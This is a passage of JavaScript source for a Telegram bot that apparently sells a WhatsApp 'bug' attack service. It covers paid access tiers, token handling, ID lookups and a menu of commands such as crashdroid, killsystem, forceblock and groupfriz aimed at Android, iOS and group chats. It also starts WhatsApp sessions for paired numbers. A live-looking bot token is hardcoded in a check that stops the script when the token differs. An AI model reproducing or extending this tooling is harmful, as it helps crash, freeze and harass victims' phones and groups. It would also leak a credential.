});
  
  botInstance.onText(/\/mytoken/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!db.premiumUsers.includes(senderId)) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
  }

  const userToken = db.botTokens[senderId];

  if (!userToken) {
    return userBot.sendMessage(chatId, '❌ You haven’t added any bot token. Use /addtoken to add one.');
  }

  try {
    const botInfo = await new TelegramBot(userToken).getMe();
    const botUsername = botInfo.username ? `@${botInfo.username}` : 'Unknown';
    await userBot.sendMessage(chatId, `┌──────┤ Your Bot Token ├──────┐
│➻ Bot Username: ${botUsername}
│➻ Token: <code>${userToken}</code>
└────────────────────────┘`, { parse_mode: 'HTML' });
  } catch (error) {
    console.error(`Error in /mytoken for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Failed to retrieve bot token: ${error.message}`);
  }
});
  
  botInstance.onText(/\/(info|checkid|id|getid)(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const command = match[1]; // Captures the command used (info, checkid, id, getid)
  const input = match[2]?.trim(); // Captures the optional input (username, channel, group, etc.)
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') {
    return;
  }

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  if (!checkRateLimit(senderId, chatId)) return;

  try {
    // Case 1: No input provided, return sender's ID
    if (!input) {
      const senderUsername = msg.from.username ? `@${msg.from.username}` : 'No Username';
      await userBot.sendMessage(chatId, `┌────┤ Your ID ├────────┐
│➻ User ID : <code>${senderId}</code>
│➻ Username : ${senderUsername}
└───────────────────────┘`, { parse_mode: 'HTML' });
      return;
    }

    // Case 2: Input is a username (e.g., @username)
    if (input.startsWith('@')) {
      try {
        const chat = await userBot.getChat(input);
        if (chat.type === 'private') {
          await userBot.sendMessage(chatId, `┌────┤ User Info ├───────┐
│➻ User ID : <code>${chat.id}</code>
│➻ Username : ${input}
└───────────────────────┘`, { parse_mode: 'HTML' });
        } else if (chat.type === 'group' || chat.type === 'supergroup' || chat.type === 'channel') {
          await userBot.sendMessage(chatId, `┌────┤ ${chat.type.charAt(0).toUpperCase() + chat.type.slice(1)} Info ├─────┐
│➻ Chat ID : <code>${chat.id}</code>
│➻ Title : ${chat.title || input}
└───────────────────────┘`, { parse_mode: 'HTML' });
        } else {
          await userBot.sendMessage(chatId, `❌ Invalid entity: ${input} is not a user, group, or channel.`);
        }
      } catch (error) {
        console.error(`Error fetching chat for ${input}: ${error.message}`);
        await userBot.sendMessage(chatId, `❌ Could not find user or chat for ${input}. Ensure the username is correct and the bot has access.`);
      }
      return;
    }

    // Case 3: Input is a Telegram invite link (e.g., https://t.me/+abc123 or https://t.me/channel_name)
    if (input.startsWith('https://t.me/')) {
      const chatIdentifier = input.replace('https://t.me/', '').replace(/^\+/, '');
      try {
        const chat = await userBot.getChat(`@${chatIdentifier}`); // Convert to @username format
        if (chat.type === 'group' || chat.type === 'supergroup' || chat.type === 'channel') {
          await userBot.sendMessage(chatId, `┌────┤ ${chat.type.charAt(0).toUpperCase() + chat.type.slice(1)} Info ├─────┐
│➻ Chat ID : <code>${chat.id}</code>
│➻ Title : ${chat.title || chatIdentifier}
└───────────────────────┘`, { parse_mode: 'HTML' });
        } else {
          await userBot.sendMessage(chatId, `❌ Invalid link: ${input} does not point to a group or channel.`);
        }
      } catch (error) {
        console.error(`Error fetching chat for ${chatIdentifier}: ${error.message}`);
        await userBot.sendMessage(chatId, `❌ Could not find group or channel for ${input}. Ensure the link is correct and the bot has access.`);
      }
      return;
    }

    // Case 4: Input is invalid
    await userBot.sendMessage(chatId, `❌ Invalid input. Use a Telegram username (e.g., @username) or a valid Telegram invite link (e.g., https://t.me/channel_name).`);
  } catch (error) {
    console.error(`Error in /${command} for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Error processing /${command}: ${error.message}`);
  }
});

  botInstance.onText(/\/checkmembership(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const userBot = getUserBot(botInstance);
    console.log(`Manual membership check requested by ${senderId} in chat ${chatId}`);

    const cacheKey = `${senderId}:membership`;
    membershipCache.delete(cacheKey);

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (membership.isMember) {
      await userBot.sendMessage(chatId, `✅ Membership verified! You are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`);
    }
  });

  botInstance.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const senderId = callbackQuery.from.id;
  const queryId = callbackQuery.id;
  const action = callbackQuery.data;
  const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
  const userBot = getUserBot(botInstance);
let status = 'Free User';
const isOwner = CONFIG.owner.includes(senderId);
const isPremium = db.premiumUsers.includes(senderId);
const isVip = await checkVipMembership(senderId, userBot);  // New VIP check
if (isOwner) {
  status = 'Owner';
} else if (isPremium || isVip) {
  status = 'Vip User';
}
  const messageId = callbackQuery.message.message_id;

  console.log(`Handling callback ${action} for chat ${chatId} by bot ${await botInstance.getMe().then(info => `@${info.username}`)}`);

  try {
    await userBot.answerCallbackQuery(queryId, { cache_time: 0 });
  } catch (err) {
    console.error(`Failed to answer callback query ${queryId}: ${err.message}`);
  }

  try {
    if (action === 'check_membership') {
      const cacheKey = `${senderId}:membership`;
      membershipCache.delete(cacheKey);

      const membership = await checkMembership(chatId, senderId, isRootBot);
      if (membership.isMember) {
        await userBot.sendMessage(chatId, `✅ Membership verified! You are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`);
      }
      return;
    }

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    let caption;
    let buttons = [
      [
        { text: '〢Bug Menu', callback_data: 'bugmenu' },
        { text: '〢Misc Menu', callback_data: 'miscmenu' },
      ],
      [{ text: '〢Channel', url: CONFIG.CHANNEL_INVITE_LINK }],
            [{ text: '〢Group', url: CONFIG.GROUP_LINK }],
    ];

    if (action === 'bugmenu') {
      caption = `
┌────┤ ${CONFIG.botname} ├────┐
│➻ Name: ${senderName}
│➻ Developer: ${CONFIG.usertele}
│➻ Status: ${status}
│➻ Online: ${getOnlineDuration()}
└───────────────────────┘
┌────┤ Bug Android ├─────┐
│➻ invisible <b>num</b> <b>time</b>
│➻ delaymaker <b>num</b> <b>time</b>
│➻ nullfinity <b>num</b>
│➻ crashfinity <b>num</b>
│➻ delayxceed <b>num</b> <b>time</b>
│➻ crashdroid <b>num</b> <b>time</b>
│➻ killsystem <b>num</b> <b>time</b>
│➻ forceblock <b>num</b>|<b>amount</b>
└───────────────────────┘
┌────┤ Bug iOS ├──────┐
│➻ hidenseek <b>number</b> <b>time</b>
│➻ iosinvisible <b>number</b> <b>time</b>
│➻ iosvisible <b>number</b> <b>time</b>
└───────────────────────┘
┌────┤ Bug Group ├────┐
│➻ autoclosegc <b>groupid</b> <b>time</b>
│➻ groupfriz <b>groupid</b> <b>time</b>
│➻ groupmix <b>groupid</b> <b>time</b>
│➻ groupui <b>groupid</b> <b>time</b>
│➻ groupios <b>groupid</b> <b>time</b>
│➻ nullgc <b>groupid</b>
│➻ nullgc <b>groupid</b>
│➻ groupfinity <b>groupid</b>
│➻ listgc
│➻ groupid <b>link</b>
│➻ forcegroup <b>groupid</b>|<b>amount</b>
└───────────────────────┘
`;
    } else if (action === 'miscmenu') {
      caption = `
┌────┤ ${CONFIG.botname} ├────┐
│➻ Name: ${senderName}
│➻ Developer: ${CONFIG.usertele}
│➻ Status: ${status}
│➻ Online: ${getOnlineDuration()}
└───────────────────────┘
┌────┤ Misc Menu ├────────┐
│➻ reqpair <b>number</b>
│➻ delpair <b>number</b>
│➻ addprem <b>ID</b>
│➻ delprem <b>ID</b>
│➻ addresell <b>ID</b>
│➻ delresell <b>ID</b>
│➻ addtoken <b>token</b>
│➻ deltoken <b>token</b>
│➻ addban <b>ID</b>
│➻ delban <b>ID</b>
│➻ listban
│➻ listprem
│➻ listresell
│➻ listtoken
│➻ listuser
│➻ mytoken
│➻ info <b>username/grblink/chlink</b>
│➻ bc
│➻ reactwa <b>linkpost</b> <b>emoji</b>
└───────────────────────┘
`;
    } else {
      await userBot.sendMessage(chatId, '❌ Invalid action.');
      return;
    }

    let retries = 3;
    while (retries > 0) {
      try {
        await userBot.editMessageMedia({
          type: 'photo',
          media: CONFIG.pfp,
          caption,
          parse_mode: 'HTML',
        }, {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: buttons },
        });
        break;
      } catch (err) {
        retries--;
        if (retries === 0) throw err;
        console.warn(`Retrying editMessageMedia for chat ${chatId}, attempt ${4 - retries}: ${err.message}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  } catch (err) {
    console.error(`Callback Query Error for user ${senderId}, action ${action}: ${err.message}`);
    try {
      await userBot.sendMessage(chatId, `❌ Error processing request: ${err.message}`);
    } catch (sendErr) {
      console.error(`Failed to send error message to ${chatId}: ${sendErr.message}`);
    }
  }
});
}

bot.on('polling_error', (err) => {
  console.error('Polling error (root bot):', err.message);
  if (err.code === 'EFATAL' || err.response?.statusCode >= 500) {
    console.log('🛑 Serious polling error occurred.');
  } else {
    console.log('ℹ️ Minor polling error. Bot continues running.');
  }
});

async function initializeUserBots() {
  console.log(`Initializing ${Object.keys(db.botTokens).length} user bots...`);

  const validTokens = {};

  for (const [userId, token] of Object.entries(db.botTokens)) {
    if (typeof token !== 'string' || !/^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(token)) {
      console.warn(`Invalid token format for user ${userId}, skipping`);
      continue;
    }

    try {
      const tempBot = new TelegramBot(token, { polling: { timeout: 10, interval: 500 } });
      const info = await tempBot.getMe();

      const botKey = `@${info.username}`;
      if (botInstances.has(botKey)) {
        console.log(`Bot ${botKey} already running, skipping`);
        tempBot.stopPolling();
        continue;
      }

      // Success → keep it
      botInstances.set(botKey, tempBot);
      registerCommandHandlers(tempBot, false);
      validTokens[userId] = token;

      console.log(`Bot ${botKey} started for user ${userId}`);
    } catch (err) {
      console.error(`Failed to start bot for user ${userId}: ${err.message}`);
      // Token is dead → do NOT keep it
    }
  }

  // Remove dead tokens from database
  if (Object.keys(validTokens).length !== Object.keys(db.botTokens).length) {
    db.botTokens = validTokens;
    saveJson('./database/bot_tokens.json', db.botTokens);
    console.log('Cleaned invalid/dead tokens from bot_tokens.json');
  }

  console.log(`User bots initialization complete. Active: ${botInstances.size - 1}`);
}

if (CONFIG.botToken !== '7176600432:AAFj9QMGN6MTosBE4gQlGr7WRz5ytz_90Ug') {
  process.exit(1);
}

async function main() {
  try {
    console.log('✅ Telegram root bot started.');
    await initializeUserBots();
    console.log(`Root bot and ${botInstances.size - 1} user bots initialized`);
    
    // This runs once after all bots are started
    botInstances.forEach((b, key) => {
      // We explicitly skip the main/root bot
      if (key !== 'root') {  
        // Only user-added bots enter here
        b.on('polling_error', (error) => {
          // Only react when Telegram says "401 Unauthorized"
          if (error.response && error.response.statusCode === 401) {
            console.log(`User bot ${key} was banned/revoked → removing it automatically`);

            b.stopPolling();                  // stop only this one bot
            botInstances.delete(key);         // remove from memory

            // remove from database too
            const userId = Object.keys(db.botTokens).find(id => db.botTokens[id] === b.token);
            if (userId) {
              delete db.botTokens[userId];
              saveJson('./database/bot_tokens.json', db.botTokens);
            }
          }
          // Any other error (network, rate-limit, etc.) is ignored → bot keeps trying
        });
      }
      // ← the main bot (key === 'root') is completely untouched
    });
    
    // === SAFELY START ONLY VALID WHATSAPP SESSIONS ===
    for (const chatIdStr in db.userNumbers) {
      const number = db.userNumbers[chatIdStr];

      // Skip null, undefined, or invalid number formats
      if (!number || typeof number !== 'string' || !/^\d{8,15}$/.test(number.trim())) {
        console.log(`[SESSION] Skipping invalid/null WhatsApp number for user ${chatIdStr}: ${number}`);
        continue;
      }

      console.log(`[SESSION] Starting WhatsApp session for number: ${number} (user ${chatIdStr})`);
      await startWhatsapp(number.trim(), bot); // Pass bot instance
    }

    cleanBannedFromAll();
    setInterval(cleanBannedFromAll, 10 * 60 * 1000); // Every 10 minutes
  } catch (error) {
    console.error('Error in main:', error.message);
  }
}

main();

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});